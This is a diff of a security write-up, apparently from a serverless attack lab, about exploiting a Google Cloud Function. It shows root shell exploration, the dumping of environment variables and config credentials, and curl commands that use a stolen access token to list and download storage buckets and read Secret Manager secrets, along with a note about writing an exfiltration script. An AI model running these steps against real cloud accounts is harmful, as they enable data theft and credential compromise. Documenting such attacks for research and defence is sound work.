@@ -12,61 +12,33 @@ whoami
 root
 ```
 
-Exploring through the filesystem:
+Exploring through the source code:
 
 ```
 pwd
-/srv/files
+/workspace
 
 ls -la
-total 167
-drwxr-xr-x 2 root root      0 Jan  3 16:49 .
-drwxr-xr-x 2 root root      0 Jan  3 16:49 ..
--rw-r--r-- 1 root root    268 Jan  3 16:49 Makefile
--rw-r--r-- 1 root root   1898 Jan  3 16:49 cheetah.go
--rw-r--r-- 1 root root    178 Jan  3 16:49 cheetah.yaml
--rw-r--r-- 1 root root    170 Jan  3 16:49 go.mod
--rw-r--r-- 1 root root   1798 Jan  3 16:49 go.sum
--rw-r--r-- 1 root root 166598 Jan  3 16:49 package-lock.json
--rw-r--r-- 1 root root    939 Jan  3 16:49 package.json
--rw-r--r-- 1 root root    710 Jan  3 16:49 serverless.yml
+total 80
+drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 .
+drwxr-xr-x 7 root     root         0 Sep 29 17:42 ..
+drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 .googlebuild
+-rw-r--r-- 1 www-data www-data   270 Jan  1  1980 go.mod
+-rw-r--r-- 1 www-data www-data 78994 Jan  1  1980 go.sum
+-rw-r--r-- 1 www-data www-data  1893 Jan  1  1980 main.go
+drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 serverless_function_source_code
 
-ls -al /srv
-total 6
-drwxr-xr-x 2 root root    0 Dec 24 04:51 .
-drwxr-xr-x 2 root root    0 Dec 24 04:51 ..
-drwxr-xr-x 2 root root    0 Dec 24 04:51 files
--rw-r--r-- 1 root root  189 Dec 24 04:51 go.mod
--r-xr-xr-x 1 root root   11 Dec 24 04:51 serverless-build.yaml
-drwxr-xr-x 2 root root    0 Dec 24 04:51 vendor
--r-xr-xr-x 1 root root 6267 Dec 24 04:51 worker.go
-```
+ls -al /workspace/serverless_function_source_code
+total 80
+drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 .
+drwxr-xr-x 2 www-data www-data     0 Jan  1  1980 ..
+-rwxr-xr-x 1 www-data www-data  4519 Jan  1  1980 cheetah.go
+-rwxr-xr-x 1 www-data www-data   311 Jan  1  1980 cheetah.yaml
+-rwxr-xr-x 1 www-data www-data   194 Jan  1  1980 go.mod
+-rwxr-xr-x 1 www-data www-data 75588 Jan  1  1980 go.sum
 
-`/srv/vendor` appears to contain helper code from Google:
+cat /workspace/serverless_function_source_code/cheetah.yaml
 
-```
-ls -al /srv/vendor
-total 0
-drwxr-xr-x 2 root root 0 Dec 24 04:51 .
-drwxr-xr-x 2 root root 0 Dec 24 04:51 ..
-drwxr-xr-x 2 root root 0 Dec 24 04:51 gcfeventhelper
-
-ls -al /srv/vendor/gcfeventhelper
-total 4
-drwxr-xr-x 2 root root    0 Dec 24 04:51 .
-drwxr-xr-x 2 root root    0 Dec 24 04:51 ..
--r-xr-xr-x 1 root root 3886 Dec 24 04:51 event.go
--r-xr-xr-x 1 root root   22 Dec 24 04:51 go.mod
-
-cat /srv/vendor/gcfeventhelper/event.go
-// Package gcfeventhelper exports a helper function GetMetadataAndDataFromBody that unmarshalls
-// an event from supervisor (both legacy and current API) and returns GCF-specific
-// metadata and event data.
-...
-```
-
-```
-cat cheetah.yaml
 # Server configurations
 server:
   host: "10.42.42.42"
@@ -75,16 +47,21 @@ server:
 # Database credentials
 database:
   user: "cheetah_user"
-  pass: "QnV0IHVuaWNvcm5zIGFwcGFyZW50bHkgZG8gZXhpc3Qu"
+  pass: "TmV2ZXIgcGxheSBwb2tlciB3aXRoIHRoZSB3b3JsZCdzIGZhc3Rlc3QgYW5pbWFsLCBiZWNhdXNlIGhlJ3MgYSBjaGVldGFoLiAtIGNvb2xmdW5ueXF1b3Rlcy5jb20g"
+
+# Storage bucket
+gcs:
+  bucket: cheetah-abc123
 ```
 
 ```
 cat /etc/os-release
+cat /etc/os-release
 NAME="Ubuntu"
-VERSION="18.04.2 LTS (Bionic Beaver)"
+VERSION="18.04.6 LTS (Bionic Beaver)"
 ID=ubuntu
 ID_LIKE=debian
-PRETTY_NAME="Ubuntu 18.04.2 LTS"
+PRETTY_NAME="Ubuntu 18.04.6 LTS"
 VERSION_ID="18.04"
 HOME_URL="https://www.ubuntu.com/"
 SUPPORT_URL="https://help.ubuntu.com/"
@@ -94,55 +71,25 @@ VERSION_CODENAME=bionic
 UBUNTU_CODENAME=bionic
 ```
 
+Writing to root file system works.
+
 ```
-echo "test" > test.txt
-/bin/sh: 5: cannot create test.txt: Read-only file system
+echo "test" > /root/test.txt
 ```
 
 ```
 env
-X_GOOGLE_FUNCTION_TIMEOUT_SEC=60
-X_GOOGLE_FUNCTION_MEMORY_MB=256
-FUNCTION_TIMEOUT_SEC=60
-FUNCTION_MEMORY_MB=256
-X_GOOGLE_LOAD_ON_START=false
+GCF_BLOCK_RUNTIME_nodejs6=410
+K_REVISION=1
 HOME=/root
-X_GOOGLE_FUNCTION_TRIGGER_TYPE=HTTP_TRIGGER
 PORT=8080
-ENTRY_POINT=Cheetah
-X_GOOGLE_SUPERVISOR_HOSTNAME=169.254.8.129
-FUNCTION_TRIGGER_TYPE=HTTP_TRIGGER
-X_GOOGLE_FUNCTION_NAME=Cheetah
-X_GOOGLE_GCLOUD_PROJECT=brandonevans
-FUNCTION_NAME=Cheetah
-SUPERVISOR_INTERNAL_PORT=8081
-X_GOOGLE_GCP_PROJECT=brandonevans
-X_GOOGLE_FUNCTION_REGION=us-central1
-X_GOOGLE_ENTRY_POINT=Cheetah
-FUNCTION_REGION=us-central1
-PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-X_GOOGLE_WORKER_PORT=8091
-CODE_LOCATION=/srv
-SUPERVISOR_HOSTNAME=169.254.8.129
-WORKER_PORT=8091
+FUNCTION_SIGNATURE_TYPE=http
+GCF_BLOCK_RUNTIME_go112=410
+PATH=/layers/google.go.build/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+FUNCTION_TARGET=Cheetah
 DEBIAN_FRONTEND=noninteractive
-X_GOOGLE_FUNCTION_IDENTITY=brandonevans@appspot.gserviceaccount.com
-X_GOOGLE_CONTAINER_LOGGING_ENABLED=true
-GCLOUD_PROJECT=brandonevans
-FUNCTION_IDENTITY=brandonevans@appspot.gserviceaccount.com
-X_GOOGLE_CODE_LOCATION=/srv
-PWD=/srv/files/
-GCP_PROJECT=brandonevans
-X_GOOGLE_SUPERVISOR_INTERNAL_PORT=8081
-X_GOOGLE_FUNCTION_VERSION=2
-NODE_ENV=production
-```
-
-The supervisor service is could be a point of interest?
-
-```
-curl 169.254.8.129:8081
-404 page not found
+K_SERVICE=serverless-prey-cheetah-abc123
+PWD=/workspace
 ```
 
 ## Metadata Endpoint
@@ -215,8 +162,10 @@ At the time of this writing, I have not found a way to load up the OAuth access 
 Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.
 
 ```bash
-export GOOGLE_TOKEN=<INSERT ACCESS TOKEN>
-export GOOGLE_PROJECT=<GOOGLE PROJECT>
+export GCP_TOKEN=<INSERT ACCESS TOKEN>
+export GCP_PROJECT=<GOOGLE PROJECT>
+export GCP_SECRET=<SECRET ID>
+export GCP_BUCKET=<BUCKET NAME>
 ```
 
 TODO: Write a bucket exfiltration script to do the following for us for all buckets and all items in the project. See the [Cloud Storage JSON API](https://cloud.google.com/storage/docs/json_api/) for details.
@@ -224,53 +173,40 @@ TODO: Write a bucket exfiltration script to do the following for us for all buck
 List the buckets for the project and query the first bucket:
 
 ```bash
-curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq '.items[0].selfLink'
+curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GCP_PROJECT" | jq '.items[0].selfLink'
 ```
 
 List the objects in the storage bucket
 
 ```bash
-export GOOGLE_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq -r '.items[0].selfLink')
-curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_PROJECT_BUCKET/o"
+export GCP_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GCP_PROJECT" | jq -r '.items[0].selfLink')
+curl -s -H "Authorization: Bearer $GCP_TOKEN" "$GCP_PROJECT_BUCKET/o"
+```
+
+Get the object (including metadata) from the bucket
+
+```bash
+curl -s -H "Authorization: Bearer $GCP_TOKEN" "https://storage.googleapis.com/storage/v1/b/$GCP_BUCKET/o/cheetah.jpg"
 ```
 
 Download the object from the bucket:
 
 ```bash
-export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
-curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
+export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GCP_TOKEN" "$GCP_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
+curl -s -H "Authorization: Bearer $GCP_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/cheetah.jpg
 ```
 
 At the time of this writing, the secrets manager appears to still be in Beta. See the [API Reference](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets) for details on accessing the API. List the secrets in the project:
 
 ```bash
-curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets
-```
-
-Dump the secret value:
-
-```bash
-export SECRET_NAME=$(curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GOOGLE_PROJECT/secrets | jq -r '.secrets[0].name')
-curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
-```
-
-By default this returns a *403* from the service account running the function:
-
-```json
-{
-  "error": {
-    "code": 403,
-    "message": "Permission 'secretmanager.versions.access' denied for resource 'projects/123/secrets/cheetah-database-pass/versions/1' (or it may not exist).",
-    "status": "PERMISSION_DENIED"
-  }
-}
+curl -s -H "Authorization: Bearer $GCP_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GCP_PROJECT/secrets
 ```
 
 It appears this is not included the default editor role permissions. You have to explicitly grant the service account the "Secret Manager Secret Accessor" (secretmanager.versions.access) role to view the secret value. Then, running the command returns the following:
 
 
 ```bash
-curl -s -H "Authorization: Bearer $GOOGLE_TOKEN" https://secretmanager.googleapis.com/v1beta1/$SECRET_NAME/versions/latest:access
+curl -s -H "Authorization: Bearer $GCP_TOKEN" https://secretmanager.googleapis.com/v1beta1/projects/$GCP_PROJECT/secrets/$GCP_SECRET/versions/latest:access
 
 {
   "name": "projects/123/secrets/cheetah-database-pass/versions/1",
